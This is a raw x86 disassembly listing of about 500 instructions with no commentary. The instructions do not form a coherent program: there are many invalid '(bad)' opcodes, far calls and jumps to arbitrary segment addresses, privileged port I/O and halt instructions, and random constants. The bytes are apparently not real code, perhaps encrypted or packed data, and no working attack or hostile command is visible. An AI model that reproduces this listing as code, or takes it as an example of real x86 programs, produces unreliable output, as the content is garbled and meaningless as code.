  41e9d7:	cs out 0xa7,al
  41e9da:	pop    es
  41e9db:	aas    
  41e9dc:	jle    0x41ea28
  41e9de:	push   edi
  41e9df:	pop    ebp
  41e9e0:	aas    
  41e9e1:	xor    ecx,DWORD PTR [edi+0x27]
  41e9e4:	cmp    al,0x2e
  41e9e6:	or     BYTE PTR [ecx],al
  41e9e8:	push   cs
  41e9e9:	dec    ebp
  41e9ea:	xchg   DWORD PTR [esi+0x41687c11],esp
  41e9f0:	add    al,0xc5
  41e9f2:	pop    edi
  41e9f3:	push   esp
  41e9f4:	sbb    cl,BYTE PTR [eax+eiz*2]
  41e9f7:	mov    esi,DWORD PTR [edx-0xed4e014]
  41e9fd:	jge    0x41e9a8
  41e9ff:	sbb    cl,BYTE PTR ss:[eax]
  41ea02:	cmp    bl,ah
  41ea04:	push   0xffffffd8
  41ea06:	mov    ebx,0x29c42add
  41ea0b:	mov    edi,0x76cd69b2
  41ea10:	out    0x46,al
  41ea12:	or     bh,bl
  41ea14:	test   DWORD PTR [ebx+ebx*8],eax
  41ea17:	inc    ebx
  41ea18:	inc    edx
  41ea19:	mov    esi,es
  41ea1b:	addr16 push ecx
  41ea1d:	lds    ecx,FWORD PTR [eax+0x61]
  41ea20:	in     eax,dx
  41ea21:	jl     0x41e9bd
  41ea23:	mov    cs,WORD PTR [ebx-0x7a]
  41ea26:	sub    esp,DWORD PTR [esi-0x23]
  41ea29:	dec    esi
  41ea2a:	leave  
  41ea2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea2c:	mov    ds:0xfc3de88,eax
  41ea31:	call   0x2110:0x19b21413
  41ea38:	mov    edi,0x29690780
  41ea3d:	or     ecx,ebx
  41ea3f:	mov    ecx,0xdaaccfe9
  41ea44:	or     eax,0x3e8a22d
  41ea49:	or     esi,DWORD PTR [eax+0x5078093]
  41ea4f:	pop    esp
  41ea50:	xor    cl,BYTE PTR [ebx]
  41ea52:	in     eax,0x26
  41ea54:	shl    DWORD PTR [ecx+0x71],0xbe
  41ea58:	cdq    
  41ea59:	hlt    
  41ea5a:	call   0x46fe:0xf0870c1d
  41ea61:	bswap  ecx
  41ea63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea64:	outs   dx,DWORD PTR ds:[esi]
  41ea65:	dec    ecx
  41ea66:	or     al,0xb9
  41ea68:	in     eax,0xd7
  41ea6a:	jno    0x41ea5e
  41ea6c:	mov    dl,0x12
  41ea6e:	or     ebp,DWORD PTR [edi+0x6969e96d]
  41ea74:	dec    BYTE PTR [edx]
  41ea76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea77:	ja     0x41ea09
  41ea79:	retf   
  41ea7a:	xor    BYTE PTR [ebp-0x13],ah
  41ea7d:	cli    
  41ea7e:	stc    
  41ea7f:	ja     0x41ea37
  41ea81:	jo     0x41ea1d
  41ea83:	rcr    DWORD PTR [eax-0x665b3641],0x86
  41ea8a:	xchg   ebp,eax
  41ea8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea8c:	jae    0x41eab0
  41ea8e:	into   
  41ea8f:	or     dh,BYTE PTR [ebp-0x4db11cb7]
  41ea95:	(bad)  
  41ea96:	sbb    ebp,ecx
  41ea98:	stc    
  41ea99:	lods   al,BYTE PTR ds:[esi]
  41ea9a:	or     edx,edi
  41ea9c:	dec    esi
  41ea9d:	jge    0x41eac0
  41ea9f:	mov    ds:0x71d052a9,eax
  41eaa4:	ds loope 0x41eac1
  41eaa7:	push   ds
  41eaa8:	inc    esi
  41eaa9:	ja     0x41eb1c
  41eaab:	rcr    DWORD PTR [edi],cl
  41eaad:	or     DWORD PTR [ecx],esi
  41eaaf:	out    dx,al
  41eab0:	jge    0x41eaf1
  41eab2:	sbb    DWORD PTR [edx+0x72],esi
  41eab5:	pusha  
  41eab6:	pop    es
  41eab7:	sbb    dh,BYTE PTR [edx+0x54ea458b]
  41eabd:	jge    0x41eb18
  41eabf:	lods   eax,DWORD PTR ds:[esi]
  41eac0:	aas    
  41eac1:	add    al,0x86
  41eac3:	(bad)  
  41eac4:	dec    ecx
  41eac5:	xor    BYTE PTR [edx-0x38cb46cf],bl
  41eacb:	imul   esi,DWORD PTR [edx-0x2aa87c0a],0x52
  41ead2:	inc    esp
  41ead3:	lods   eax,DWORD PTR ds:[esi]
  41ead4:	mov    ds:0xd4da890b,al
  41ead9:	push   cs
  41eada:	jne    0x41eb0c
  41eadc:	or     eax,0x53229a8f
  41eae1:	retf   0x5879
  41eae4:	sti    
  41eae5:	add    edx,DWORD PTR [ebx]
  41eae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eae8:	push   eax
  41eae9:	mov    DWORD PTR [eax],esi
  41eaeb:	push   0x2c
  41eaed:	div    DWORD PTR [eax-0x45]
  41eaf0:	mov    dl,0xc0
  41eaf2:	adc    BYTE PTR [edx-0x61],0xed
  41eaf6:	jge    0x41eb56
  41eaf8:	mov    ds:0x8336e90b,eax
  41eafd:	out    0xf4,eax
  41eaff:	outs   dx,BYTE PTR ds:[esi]
  41eb00:	fist   WORD PTR [esi+esi*2+0x67]
  41eb04:	mov    dl,0x80
  41eb06:	push   ss
  41eb07:	imul   edi,edx,0x476c9356
  41eb0d:	adc    eax,0x8913bc30
  41eb12:	cs loope 0x41eb3a
  41eb15:	xchg   edx,eax
  41eb16:	fcmovbe st,st(2)
  41eb18:	aam    0x6
  41eb1a:	test   BYTE PTR [esi],cl
  41eb1c:	imul   ebx,DWORD PTR [edi+0x5d],0x783e2f97
  41eb23:	mov    edi,0xd64f4b4a
  41eb28:	push   esi
  41eb29:	mov    bl,0xde
  41eb2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb2c:	pop    ecx
  41eb2d:	or     ebx,ebx
  41eb2f:	mov    bl,0xc4
  41eb31:	js     0x41eb82
  41eb33:	cmc    
  41eb34:	mov    dl,0xf8
  41eb36:	sbb    eax,esp
  41eb38:	adc    ebp,DWORD PTR [ebp+0x3]
  41eb3b:	jmp    0x9ff52160
  41eb40:	jp     0x41eb57
  41eb42:	call   0x538f:0xb6cafacb
  41eb49:	scas   al,BYTE PTR es:[edi]
  41eb4a:	and    al,cl
  41eb4c:	mov    bl,0x29
  41eb4e:	aam    0x61
  41eb50:	sub    ebx,ebx
  41eb52:	and    DWORD PTR [ecx-0x587baa7e],ecx
  41eb58:	jle    0x41eb3c
  41eb5a:	mov    ch,0x8d
  41eb5c:	mov    DWORD PTR [eax],eax
  41eb5e:	adc    ebx,ebx
  41eb60:	mov    dl,0x64
  41eb62:	cs cmp al,0x94
  41eb65:	sbb    cl,BYTE PTR [ebp+0x4b]
  41eb68:	inc    eax
  41eb69:	or     ebx,DWORD PTR [eax-0x2d]
  41eb6c:	aas    
  41eb6d:	(bad)  
  41eb6e:	outs   dx,BYTE PTR ds:[esi]
  41eb6f:	xor    DWORD PTR [ebp-0x53],ecx
  41eb72:	call   0xe1b0:0x593ad169
  41eb79:	and    ch,BYTE PTR [ebp+0x600980a4]
  41eb7f:	sub    DWORD PTR [edx],eax
  41eb81:	iret   
  41eb82:	and    ah,BYTE PTR [eax+0x58]
  41eb85:	lds    ebx,FWORD PTR [edx+0x4bad5b20]
  41eb8b:	js     0x41eb4d
  41eb8d:	loopne 0x41ebae
  41eb8f:	mov    al,0x19
  41eb91:	sub    eax,0x3248a78e
  41eb96:	xor    eax,0x9bbdf298
  41eb9b:	sbb    eax,0x7386f264
  41eba0:	adc    al,0x90
  41eba2:	data16 gs out 0xc,al
  41eba6:	fcomp  DWORD PTR [edx+0x52]
  41eba9:	xchg   ecx,eax
  41ebaa:	mov    dh,0x67
  41ebac:	cmp    ecx,DWORD PTR [edi+0x7fb284b3]
  41ebb2:	mov    BYTE PTR [edx+0x4],bh
  41ebb5:	jb     0x41ec2c
  41ebb7:	sbb    DWORD PTR [esi],eax
  41ebb9:	or     ebx,DWORD PTR [ebp+0x0]
  41ebbc:	push   0xcab93806
  41ebc1:	pop    ecx
  41ebc2:	call   0x87c5:0xaa6e22cc
  41ebc9:	mov    esi,0x7e47a742
  41ebce:	xchg   DWORD PTR [esi],esp
  41ebd0:	dec    ecx
  41ebd1:	daa    
  41ebd2:	jne    0x41eb7e
  41ebd4:	mov    al,0xc
  41ebd6:	rcl    ebx,1
  41ebd8:	out    dx,al
  41ebd9:	out    0xd6,eax
  41ebdb:	out    0x32,eax
  41ebdd:	sub    al,0x4d
  41ebdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebe0:	fs hlt 
  41ebe2:	push   esp
  41ebe3:	or     BYTE PTR [ebp-0x6e],dl
  41ebe6:	mov    eax,cs
  41ebe8:	mov    dl,0x72
  41ebea:	popa   
  41ebeb:	loopne 0x41ebd4
  41ebed:	mov    BYTE PTR [ecx],bh
  41ebef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebf0:	adc    ecx,DWORD PTR [ebx]
  41ebf2:	xchg   esp,eax
  41ebf3:	jge    0x41ec38
  41ebf5:	jmp    0xf93a8c0d
  41ebfa:	call   0x943b:0xbfb3cc63
  41ec01:	mov    ch,0x44
  41ec03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec04:	lea    ebx,[eax-0x70]
  41ec07:	sub    DWORD PTR [ebp-0x16],esp
  41ec0a:	adc    eax,0xc06fb215
  41ec0f:	pop    es
  41ec10:	mov    eax,ds:0xeacb2bbd
  41ec15:	or     esi,DWORD PTR [ebx+0x54]
  41ec18:	retf   
  41ec19:	push   ebp
  41ec1a:	addr16 popf 
  41ec1c:	and    BYTE PTR [esi-0x706be366],ch
  41ec22:	and    eax,0xf0767c30
  41ec27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec28:	imul   edx,DWORD PTR [ebx],0x10
  41ec2b:	pop    esp
  41ec2c:	sub    edx,DWORD PTR [eax+0x7f]
  41ec2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec30:	jo     0x41ebde
  41ec32:	lods   al,BYTE PTR ds:[esi]
  41ec33:	sbb    bh,dh
  41ec35:	sub    ebx,DWORD PTR [edx+0x4187b7a4]
  41ec3b:	add    esi,edi
  41ec3d:	push   es
  41ec3e:	sbb    esp,DWORD PTR [edi-0x463e0ebe]
  41ec44:	and    eax,0xb258cb4d
  41ec49:	imul   edi,DWORD PTR [edx+0x2621d67b],0x730b992b
  41ec53:	(bad)  
  41ec55:	loope  0x41ec12
  41ec57:	push   DWORD PTR [edx]
  41ec59:	scas   eax,DWORD PTR es:[edi]
  41ec5a:	call   0xc7e7:0x63c5bc84
  41ec61:	jae    0x41ec6f
  41ec63:	sar    ebx,1
  41ec65:	add    eax,0xac1da5f7
  41ec6a:	xchg   esp,eax
  41ec6b:	jns    0x41ecde
  41ec6d:	inc    edi
  41ec6e:	stc    
  41ec6f:	push   es
  41ec70:	sbb    bh,BYTE PTR [edi]
  41ec72:	push   es
  41ec73:	push   ss
  41ec74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec75:	shr    DWORD PTR [ebx-0x27],cl
  41ec78:	mov    eax,ds:0x720a85bb
  41ec7d:	mov    ds,WORD PTR ds:0xdf3801a1
  41ec83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec84:	mov    ch,0xce
  41ec86:	push   0xb5a0534c
  41ec8b:	fwait
  41ec8c:	mov    dl,0x50
  41ec8e:	mov    BYTE PTR [ecx],dh
  41ec90:	mov    esi,0xbf7ab2af
  41ec95:	or     ecx,DWORD PTR [eax+0x7e]
  41ec98:	cmp    BYTE PTR [edx+0x57d1a35a],bl
  41ec9e:	sahf   
  41ec9f:	in     eax,dx
  41eca0:	test   BYTE PTR [ecx],dl
  41eca2:	lea    ecx,[edx]
  41eca4:	jno    0x41ecb3
  41eca6:	(bad)  
  41eca7:	pop    ds
  41eca8:	fsub   QWORD PTR [edx-0x53b85bea]
  41ecae:	mov    ecx,0x3ac62fc1
  41ecb3:	outs   dx,BYTE PTR ds:[esi]
  41ecb4:	xor    al,BYTE PTR [ebp+0x490f779d]
  41ecba:	loop   0x41ecf3
  41ecbc:	add    cl,BYTE PTR [esi]
  41ecbe:	dec    ebx
  41ecbf:	div    DWORD PTR [ecx+0xb]
  41ecc2:	popa   
  41ecc3:	lods   eax,DWORD PTR ds:[esi]
  41ecc4:	and    al,0xc2
  41ecc6:	mov    ds:0x9ab03178,eax
  41eccb:	fneni(8087 only) 
  41eccd:	jmp    0xa7f6:0x461a538f
  41ecd4:	jge    0x41ecab
  41ecd6:	mov    ebx,0x97ae3376
  41ecdb:	or     al,0xb2
  41ecdd:	sub    DWORD PTR [edi+0x20],edx
  41ece0:	add    edi,DWORD PTR [ebx]
  41ece2:	in     eax,0xea
  41ece4:	imul   ecx,DWORD PTR [ebx],0x11de70f3
  41ecea:	jmp    0x41ed2b
  41ecec:	retf   
  41eced:	xchg   esi,eax
  41ecee:	call   0x54dc:0xa18c533
  41ecf5:	aam    0x5c
  41ecf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecf8:	in     al,dx
  41ecf9:	sbb    DWORD PTR [edi],ebx
  41ecfb:	adc    ebx,DWORD PTR [edi+0x7264a71e]
  41ed01:	jmp    0x8e09344e
  41ed06:	call   0xd12edcb2
  41ed0b:	mov    edx,0x63a6d75a
  41ed10:	mov    dl,0xf1
  41ed12:	cmp    DWORD PTR fs:[ebx+0x7162bea0],esi
  41ed19:	and    eax,0x5066801
  41ed1e:	ret    0x122d
  41ed21:	fs inc edi
  41ed23:	dec    ebx
  41ed24:	std    
  41ed25:	cmc    
  41ed26:	call   0x157b:0x9bccd56b
  41ed2d:	adc    ebp,edx
  41ed2f:	test   eax,0xfe8be4f7
  41ed34:	or     DWORD PTR [ebx],0xee6c8f66
  41ed3a:	inc    ebp
  41ed3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed3c:	push   esi
  41ed3d:	fstp   QWORD PTR [edx+0xab64c67]
  41ed43:	sub    ecx,eax
  41ed45:	push   0xeb4e44b3
  41ed4a:	mul    BYTE PTR [edi-0x7b5b58c1]
  41ed50:	dec    ecx
  41ed51:	push   0x3d
  41ed53:	repz scas eax,DWORD PTR es:[edi]
  41ed55:	outs   dx,BYTE PTR ds:[esi]
  41ed56:	cld    
  41ed57:	xor    DWORD PTR [edx],esi
  41ed59:	daa    
  41ed5a:	add    BYTE PTR [ebp+0x40],0x7c
  41ed5e:	push   eax
  41ed5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed60:	mov    ds:0x49be81d1,eax
  41ed65:	cmp    al,0x28
  41ed67:	mov    edx,0x7e62e7b2
  41ed6c:	mov    WORD PTR [ecx+0xbc61c78],gs
  41ed72:	jg     0x41ed80
  41ed74:	les    edx,FWORD PTR [eax]
  41ed76:	jno    0x41ed75
  41ed78:	je     0x41edbe
  41ed7a:	sahf   
  41ed7b:	xchg   DWORD PTR [ebx+0x45],edi
  41ed7e:	out    0x1e,al
  41ed80:	jb     0x41ed1e
  41ed82:	mov    dh,0x16
  41ed84:	in     al,dx
  41ed85:	jmp    0x593893ea
  41ed8a:	imul   ebp,DWORD PTR [edi],0x77c7ee9b
  41ed90:	sbb    eax,0x56cb9a3f
  41ed95:	mov    al,0xc
  41ed97:	cmp    ebx,ebp
  41ed99:	std    
  41ed9a:	mov    esi,ebx
  41ed9c:	adc    ecx,DWORD PTR [ebx]
  41ed9e:	sar    BYTE PTR [eax],0xad
  41eda1:	test   eax,0xde9828c8
  41eda6:	call   0xd6b7:0xa3cac9ed
  41edad:	push   ds
  41edae:	mov    al,ds:0xa218eea8
  41edb3:	jnp    0x41ed86
  41edb5:	fsub   DWORD PTR [edi-0x6e13fd44]
  41edbb:	cmp    dh,BYTE PTR [edx+0x721f56b9]
  41edc1:	cwde   
  41edc2:	xor    eax,0x190a7cdf
  41edc7:	push   esi
  41edc8:	inc    esp
  41edc9:	mov    esi,0xffad4755
  41edce:	out    0x8e,eax
  41edd0:	mov    ch,0xa8
  41edd2:	adc    DWORD PTR [edx+0x59f881da],ebp
  41edd8:	pop    esp
  41edd9:	imul   esp,esp,0xffffff83
  41eddc:	sbb    BYTE PTR [ebx],cl
  41edde:	nop
  41eddf:	or     cl,BYTE PTR [eax-0x4f]
  41ede2:	mov    ch,0xd6
  41ede4:	push   ss
  41ede5:	mov    ah,0x9a
  41ede7:	ins    BYTE PTR es:[edi],dx
  41ede8:	mov    ebx,0x3dfe6816
  41eded:	inc    ecx
  41edee:	hlt    
  41edef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edf0:	rcr    BYTE PTR [edx],1
  41edf2:	cmp    al,0x86
  41edf4:	call   0xbd0e6284
  41edf9:	je     0x41ed80
  41edfb:	or     eax,edi
  41edfd:	mov    edi,DWORD PTR [ecx+0x2f156ab4]
  41ee03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee04:	or     edi,DWORD PTR [edx+ebp*2+0x42]
  41ee08:	loopne 0x41ee6f
  41ee0a:	(bad)  
  41ee0c:	dec    esi
  41ee0d:	xlat   BYTE PTR ds:[ebx]
  41ee0e:	call   0x9deb:0x3212a558
  41ee15:	ins    BYTE PTR es:[edi],dx
  41ee16:	test   al,0xa9
  41ee18:	test   BYTE PTR [eax],dl
  41ee1a:	sub    ebp,esp
  41ee1c:	lods   al,BYTE PTR ds:[esi]
  41ee1d:	retf   
  41ee1e:	push   esp
  41ee1f:	xor    eax,0xe2993bd8
  41ee24:	mov    bl,0x4d
  41ee26:	sbb    eax,0x60059c7b
  41ee2b:	pop    eax
  41ee2c:	jb     0x41ee8d
  41ee2e:	push   0xffffffa7
  41ee30:	cmp    ah,bl
  41ee32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee33:	adc    edi,edi
  41ee35:	push   0xffffffea
  41ee37:	xor    BYTE PTR [edx+0x13d1b4a8],dh
  41ee3d:	or     al,0xf2
  41ee3f:	aam    0x49
  41ee41:	xor    BYTE PTR [eax],al
  41ee43:	push   edx
  41ee44:	xor    ah,BYTE PTR [ebp-0x60557f47]
  41ee4a:	or     BYTE PTR [ebp-0x59c5df16],bl
  41ee50:	xchg   DWORD PTR [ebx+ebx*2],esi
  41ee53:	cdq    
  41ee54:	test   al,0x61
  41ee56:	sti    
  41ee57:	cwde   
  41ee58:	(bad)  
  41ee59:	in     al,0x4e
  41ee5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee5c:	pop    edx
  41ee5d:	push   edi
  41ee5e:	xor    eax,0x857bd736
  41ee63:	in     al,dx
  41ee64:	mov    dl,0xbc
  41ee66:	mov    WORD PTR [edx],?
  41ee68:	(bad)  
  41ee69:	cmp    DWORD PTR [ecx],esp
  41ee6b:	push   esi
  41ee6c:	mov    cl,0xb
  41ee6e:	scas   eax,DWORD PTR es:[edi]
  41ee6f:	stc    
  41ee70:	jecxz  0x41ee9f
  41ee72:	ret    0xda3
  41ee75:	cdq    
  41ee76:	call   0xee4a:0x76ba5cde
  41ee7d:	push   ecx
  41ee7e:	push   eax
  41ee7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee80:	push   edx
  41ee81:	dec    ecx
  41ee82:	test   BYTE PTR fs:[edi],dl
  41ee85:	pop    es
  41ee86:	in     eax,dx
  41ee87:	mov    esi,0x134e18b2
  41ee8c:	cld    
  41ee8d:	pop    esp
  41ee8e:	jne    0x41ee97
  41ee90:	jne    0x41ee7b
  41ee92:	(bad)  
  41ee93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee94:	ror    DWORD PTR [eax],cl
  41ee96:	adc    BYTE PTR [ecx-0x78000a07],0xb2
  41ee9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee9e:	push   es
  41ee9f:	(bad)  
  41eea0:	mov    ecx,0xe53c4d39
  41eea5:	or     BYTE PTR [ecx-0x4b],dh
  41eea8:	dec    ecx
  41eea9:	(bad)  
  41eeab:	imul   ebp,DWORD PTR [edx-0x6d],0xe5b346c5
  41eeb2:	lock sahf 
  41eeb4:	out    dx,al
  41eeb5:	mov    ds:0x4a7a5e4f,eax
  41eeba:	loopne 0x41ee63
  41eebc:	pop    ebp
  41eebd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eebe:	push   esp
  41eebf:	js     0x41ee87
  41eec1:	(bad)  
  41eec3:	ins    DWORD PTR es:[edi],dx
  41eec4:	mov    al,0x18
  41eec6:	mov    cl,0xc5
  41eec8:	push   ss
  41eec9:	(bad)  
  41eeca:	and    eax,0xa4da5e7
  41eecf:	mov    al,0x94
  41eed1:	xchg   edi,eax
  41eed2:	xor    BYTE PTR [esp+ebp*4-0x18],cl
  41eed6:	aad    0xb9
  41eed8:	mov    DWORD PTR [ebx-0x3d008b17],ebp
  41eede:	in     al,0xa0
  41eee0:	mov    ds:0xee0c70da,al
  41eee5:	jmp    0x41ee78
  41eee7:	sub    edi,ebp
  41eee9:	outs   dx,DWORD PTR ds:[esi]
  41eeea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eeeb:	rcl    DWORD PTR [eax],0x8b
  41eeee:	addr16 xor eax,0x9230109e
  41eef4:	inc    esi
  41eef5:	or     ebx,DWORD PTR [esp]
  41eef8:	fs popa 
  41eefa:	ins    BYTE PTR es:[edi],dx
  41eefb:	les    ecx,FWORD PTR [ebx]
  41eefd:	(bad)  
  41eefe:	popf   
  41eeff:	dec    esp
  41ef00:	pusha  
  41ef01:	cmp    al,0x72
  41ef03:	jbe    0x41eea7
  41ef05:	stos   DWORD PTR es:[edi],eax
  41ef06:	mov    ch,0x7f
  41ef08:	in     eax,dx
  41ef09:	or     eax,DWORD PTR [esi-0x641db0ba]
  41ef0f:	push   0xd6868c91
  41ef14:	jmp    0xda2:0xa856da47
  41ef1b:	or     al,0xb8
  41ef1d:	add    eax,0xb279b6ab
  41ef22:	cmp    ah,BYTE PTR [edi]
  41ef24:	inc    esp
  41ef25:	in     al,dx
  41ef26:	hlt    
  41ef27:	enter  0x78b3,0x71
  41ef2b:	xor    al,0x24
  41ef2d:	push   ebp
  41ef2e:	repnz sti 
  41ef30:	push   0x5f
  41ef32:	jae    0x41eedb
  41ef34:	pop    ebp
  41ef35:	jae    0x41eede
  41ef37:	and    ecx,edx
  41ef39:	inc    ecx
  41ef3a:	cmp    BYTE PTR [ecx+0x64ef1cb7],ah
  41ef40:	call   0xe3d8085d
  41ef45:	fild   DWORD PTR [eax]
  41ef47:	mov    bl,0x12
  41ef49:	or     BYTE PTR [edi+0x29e487ed],al
  41ef4f:	cmp    al,0x62
  41ef51:	into   
  41ef52:	and    BYTE PTR [ebp-0x4e],ah
  41ef55:	scas   eax,DWORD PTR es:[edi]
  41ef56:	pop    ss
  41ef57:	push   es
  41ef58:	jbe    0x41efd7
  41ef5a:	add    al,0xa4
  41ef5c:	dec    ebx
  41ef5d:	or     edx,DWORD PTR [edx]
  41ef5f:	cmp    eax,0x33ee7e00
  41ef64:	fadd   QWORD PTR [ecx-0x1e]
  41ef67:	jp     0x41ef1c
  41ef69:	push   eax
  41ef6a:	sub    eax,0x709a21e7
  41ef6f:	sub    esi,DWORD PTR [edx-0x42]
  41ef72:	jns    0x41ef1b
  41ef74:	popa   
  41ef75:	dec    esp
  41ef76:	xchg   DWORD PTR [ebp-0x6712d582],eax
  41ef7c:	mov    dl,0xc3
  41ef7e:	test   DWORD PTR [ebx+esi*1],ecx
  41ef81:	mov    BYTE PTR [eax],bh
  41ef83:	cli    
  41ef84:	inc    eax
  41ef85:	or     al,0x62
  41ef87:	and    eax,0xd7426fd0
  41ef8c:	pop    ebp
  41ef8d:	addr16 sti 
  41ef8f:	mov    ch,0xaf
  41ef91:	pop    ss
  41ef92:	aas    
  41ef93:	xchg   ebx,eax
  41ef94:	mov    dl,0x4
  41ef96:	add    bl,bl
  41ef98:	cmp    BYTE PTR [edx+0x57afa723],cl
  41ef9e:	outs   dx,DWORD PTR ds:[esi]
  41ef9f:	jecxz  0x41ef2b
  41efa1:	jge    0x41ef73
  41efa3:	enter  0x5f88,0x53
  41efa7:	daa    
  41efa8:	rcr    edi,1
  41efaa:	repz and BYTE PTR [esi],ch
  41efad:	xchg   esi,eax
  41efae:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41efb0:	adc    al,0xfb
  41efb2:	and    eax,0x5bd3ff71
  41efb7:	popa   
  41efb8:	mov    dl,0x98
  41efba:	mov    eax,ds:0x6765a288
  41efbf:	ret    0xbcf
  41efc2:	xchg   esp,eax
  41efc3:	pop    eax
  41efc4:	cmp    ebx,ecx
  41efc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efc7:	add    DWORD PTR [edi],edi
  41efc9:	mov    bh,0x9d
  41efcb:	jle    0x41f04b
  41efcd:	out    dx,eax
  41efce:	sbb    ebp,edi
  41efd0:	ret    0x9fd8
  41efd3:	adc    al,0xa6
  41efd5:	jle    0x41ef77
  41efd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efd8:	mov    esi,0x9b99938c
  41efdd:	adc    bl,BYTE PTR [edi]
  41efdf:	add    cl,BYTE PTR [ecx-0xd5891f6]
  41efe5:	xor    BYTE PTR [esi-0x4c],dh
  41efe8:	jo     0x41ef7c
  41efea:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efec:	inc    ebp
  41efed:	clc    
  41efee:	adc    DWORD PTR [ecx+0x1ef6a282],esi
  41eff4:	mov    ah,0x8c
  41eff6:	popa   
  41eff7:	xchg   ebp,eax
  41eff8:	imul   esi,DWORD PTR [esi-0x590c5880],0xffffffb9
  41efff:	xor    BYTE PTR [ebp-0x4d92e05b],bh
  41f005:	xor    eax,0xc6d4b46e
  41f00a:	xchg   edx,eax
  41f00b:	xor    ecx,DWORD PTR gs:[edx]
  41f00e:	mov    esi,0x42a0e2cf
  41f013:	mov    ds:0x716fe765,al
  41f018:	mov    dl,0x78
  41f01a:	jnp    0x41f022
  41f01c:	mov    dl,BYTE PTR [eax]
  41f01e:	out    0xd0,eax
  41f020:	out    0x4,al
  41f022:	cmp    al,bh
  41f024:	retf   
  41f025:	adc    DWORD PTR [edx-0x741a457d],ebx
  41f02b:	cwde   
  41f02c:	mov    dl,0x9a
  41f02e:	mov    ebx,0xaa16ae80
  41f033:	mov    esi,0xdff336c
  41f038:	das    
  41f039:	push   0xffffffd6
  41f03b:	cmp    BYTE PTR [di-0x2c2],dh
  41f040:	xor    al,0x5a
  41f042:	test   DWORD PTR [ecx+0x2721dc5d],esi
  41f048:	sbb    eax,0xc1c19323
  41f04d:	xchg   DWORD PTR [edx+0x2b6a75a7],esp
  41f053:	push   cs
  41f054:	retf   0x912a
  41f057:	popf   
  41f058:	mov    dl,0xb1
  41f05a:	xchg   esi,eax
  41f05b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f05c:	scas   eax,DWORD PTR es:[edi]
  41f05d:	dec    esp
  41f05e:	add    al,0xf2
  41f060:	rcl    BYTE PTR [edi+edi*2],0x66
  41f064:	and    al,0x88
  41f066:	xor    DWORD PTR [edx+eax*8],edx
  41f069:	pop    ecx
  41f06a:	gs ja  0x41f095
  41f06d:	mov    bl,BYTE PTR ds:0xe5a9b208
  41f073:	adc    edx,DWORD PTR [ebp+0x2d]
  41f076:	lock mul DWORD PTR [edi+0x16d25e08]
  41f07d:	dec    esp
  41f07e:	push   ss
  41f07f:	shl    DWORD PTR [edx],1
  41f081:	lods   eax,DWORD PTR ds:[esi]
  41f082:	mov    bh,0xe2
  41f084:	mov    dl,0xe1
  41f086:	and    DWORD PTR [ebp+0xe9208a8],ecx
  41f08c:	jb     0x41f097
  41f08e:	dec    edx
  41f08f:	mov    eax,0x3629fd93
  41f094:	shr    DWORD PTR [esi],cl
  41f096:	push   es
  41f097:	jp     0x41f0f5
  41f099:	jmp    0xce553a18
  41f09e:	call   0x5afe:0x8171e1a1
  41f0a5:	inc    ebx
  41f0a6:	mov    WORD PTR [edi+0x3417f1e7],fs
  41f0ac:	fwait
  41f0ad:	sbb    BYTE PTR [edi],bl
  41f0af:	pop    es
  41f0b0:	mov    dl,0x11
  41f0b2:	ss sub eax,0x1fd082e2
  41f0b8:	mov    ebp,0xb31c8233
  41f0bd:	popa   
  41f0be:	mov    esp,0xe1d6b4ad
  41f0c3:	lea    eax,[edx+0x27]
  41f0c6:	mov    ds:0x5d0ad9a7,eax
  41f0cb:	leave  
  41f0cc:	dec    edx
  41f0cd:	xor    eax,edx
  41f0cf:	add    BYTE PTR [edx-0x1098d6fc],dh
  41f0d5:	mov    ebp,0x16200303
  41f0da:	ror    BYTE PTR [ebx+ecx*4-0x7c3172b5],0x72
  41f0e2:	push   edi
  41f0e3:	adc    eax,0x776617b2
  41f0e8:	dec    ebp
  41f0e9:	(bad)  
  41f0ea:	dec    ebx
  41f0eb:	clc    
  41f0ec:	je     0x41f0f9
  41f0ee:	test   edx,esi
  41f0f0:	dec    esp
  41f0f1:	push   eax
  41f0f2:	jle    0x41f10a
  41f0f4:	rol    BYTE PTR [ebx-0x72],cl
  41f0f7:	stc    
  41f0f8:	ja     0x41f0bf
  41f0fa:	pop    ebx
  41f0fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0fc:	pop    edx
  41f0fd:	stos   DWORD PTR es:[edi],eax
  41f0fe:	fsubr  DWORD PTR [edi-0x59b8852c]
  41f104:	pop    eax
  41f105:	add    eax,0x88dc9e44
  41f10a:	js     0x41f157
